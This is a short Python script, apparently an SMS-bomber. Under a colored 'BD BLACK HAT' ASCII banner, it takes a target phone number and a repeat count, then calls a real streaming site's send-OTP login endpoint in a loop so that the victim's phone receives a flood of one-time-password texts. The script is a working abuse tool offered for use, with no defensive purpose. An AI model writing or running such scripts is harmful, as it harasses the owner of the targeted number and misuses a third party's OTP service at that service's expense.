import colorama
from colorama import Fore, Back, Style
colorama.init(autoreset=True)

print(Fore.RED + '________________$$$$          +-+-+-+-+-+                     ')
print(Fore.RED + '______________$$____$$       |M|a|r|u|f|                   ')
print(Fore.RED + '______________$$____$$       +-+-+-+-+-+                   ')
print(Fore.RED + '______________$$____$$')
print(Fore.RED + '______________$$____$$')
print(Fore.RED + '______________$$____$$')
print(Fore.RED + '__________$$$$$$____$$$$$$')
print(Fore.RED + '________$$____$$____$$____$$$$')
print(Fore.RED + '________$$____$$____$$____$$__$$')
print(Fore.RED + '$$$$$$__$$____$$____$$____$$__$$')
print(Fore.RED + '$$____$$$$                             $$      $$')
print(Fore.RED + '$$______$$                                        $$')
print(Fore.RED + '__$$____$$                                       $$')
print(Fore.RED + '___$$$__$$                                      $$')
print(Fore.RED + '____$$                                              $$')
print(Fore.RED + '_____$$$                                         $$')
print(Fore.RED + '______$$                                        $$')
print(Fore.RED + '_______$$$                                    $$')
print(Fore.RED + '________$$                                    $$')
print(Fore.RED + '_________$$$                             $$$')
print(Fore.RED + '__________$$                              $$')
print(Fore.RED + '__________$$$$$$$$$$$$$$$$$')
print(Fore.GREEN + Style.BRIGHT + ']]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]')
print(Fore.CYAN +        'SSSSS  MM         MM  SSSSS')
print(Fore.CYAN +        'SS          MMM  MMM SS')
print(Fore.CYAN +        'SSSSS  MM MM MM  SSSSS')
print(Fore.CYAN +        '       SS   MM         MM          SS')
print(Fore.CYAN +         'SSSSS  MM         MM  SSSSS')
print(Fore.YELLOW + Style.BRIGHT +  ']]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]')
print(Fore.CYAN + Style.BRIGHT + '→AUTHOR    :|M|A|R|U|F| |H|O|S|S|A|I|N|')
print(Fore.CYAN + Style.BRIGHT + '→NICK NAME      :C|O|D|E| 6|9')

print(Style.BRIGHT + Fore.CYAN + '_________________________________________')
print(Style.BRIGHT + Fore.CYAN + 'DO NOT TRUST ANY ONE↑↑↑↑↑')
print(Style.BRIGHT + Fore.CYAN + '_________________________________________')
print(Style.BRIGHT + Fore.CYAN + 'WE PROTECT BANGLADESH😈')
print(Style.BRIGHT + Fore.CYAN + '←WE ARE BD BLACK HAT→ 😈')
print(Style.BRIGHT + Fore.CYAN + '_________________________________________')

import requests

#GET
number=str(input(Style.BRIGHT + Fore.RED + "[01]  ENTER YOUR NUMBER      :"))


api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"

amount=int(input(Style.BRIGHT + Fore.RED + "[02]  Enter Your Amount             :"))

for i in range(amount):
	requests.get(api)	
	print(str(i+1)+ Style.BRIGHT + Fore.GREEN + "sms sent successful®√ ")
